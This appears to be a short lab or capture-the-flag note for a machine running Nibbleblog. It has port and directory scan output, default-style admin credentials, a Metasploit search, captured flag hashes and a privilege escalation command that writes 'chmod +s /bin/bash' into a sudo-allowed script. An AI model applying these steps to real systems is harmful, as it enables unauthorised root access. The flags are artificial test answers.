@@ -1,0 +1,49 @@
+**IPv4: 10.129.234.146**
+
+## Enumeration/Scanning
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+
+sudo gobuster dir -u http://10.129.234.146/nibbleblog -w /usr/share/wordlists/dirb/common.txt -x php
+/admin                (Status: 301) [Size: 327] [--> http://10.129.234.146/nibbleblog/admin/]
+/admin.php            (Status: 200) [Size: 1401]
+/admin.php            (Status: 200) [Size: 1401]
+/content              (Status: 301) [Size: 329] [--> http://10.129.234.146/nibbleblog/content/]
+/feed.php             (Status: 200) [Size: 302]
+/index.php            (Status: 200) [Size: 2987]
+/index.php            (Status: 200) [Size: 2987]
+/install.php          (Status: 200) [Size: 78]
+/languages            (Status: 301) [Size: 331] [--> http://10.129.234.146/nibbleblog/languages/]
+/plugins              (Status: 301) [Size: 329] [--> http://10.129.234.146/nibbleblog/plugins/]
+/README               (Status: 200) [Size: 4628]
+/sitemap.php          (Status: 200) [Size: 402]
+/themes               (Status: 301) [Size: 328] [--> http://10.129.234.146/nibbleblog/themes/]
+/update.php           (Status: 200) [Size: 1622]
+
+user: admin
+
+admin@nibbles.com
+
+/nibbleblog/admin.php
+pass nibbles
+
+msfconsole
+search nibbleblog
+
+7d9bf5f4de9f09685e046df57d7627d1
+
+(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+echo "chmod +s /bin/bash" > monitor.sh
+
+20baf82682d9280d85c202f648126c4e
+
+
+## Exploitation
+
+
+## Privilege Escalation
+
+
+## Post-exploitation
+
